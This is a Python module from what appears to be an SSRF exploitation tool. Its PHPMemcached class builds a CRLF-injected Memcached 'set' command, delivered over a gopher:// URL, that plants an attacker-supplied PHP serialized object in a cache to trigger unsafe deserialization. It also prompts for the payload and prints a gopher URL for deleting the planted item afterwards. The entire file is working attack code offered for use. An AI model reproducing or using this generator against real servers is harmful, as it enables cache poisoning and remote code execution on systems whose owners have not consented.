from .base import *
from .encoding import to_bytes

class PHPMemcached(GENERATOR):
    default_port = 11211
    requirement = ["code"]

    def __init__(self, parser, options=None):
        super().__init__(parser, options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()
        if arg.code == "":
            self.code = self.wizard()
        else:
            self.code = arg.code

    def generate(self):
        code = self.code 
        payload = "set SpyD3r 4 0 " + str(len(to_bytes(code))) + "\r\n" + code + "\r\n"
        self.set_url_payload(payload).\
            prefix("%0d%0a")
        return super().generate()

    def wizard(self):
        print("\033[96m" +"Give payload you want to run in Memcached Server: "+ "\033[0m")
        code = input("\033[96m" +"Give serialization payload\nexample: O:5:\"Hello\":0:{}   : "+ "\033[0m")
        return code
    
    def tailcall(self):
        print("\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m")
        print("\033[04m" + f"gopher://{self.host}:{self.port}/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m")

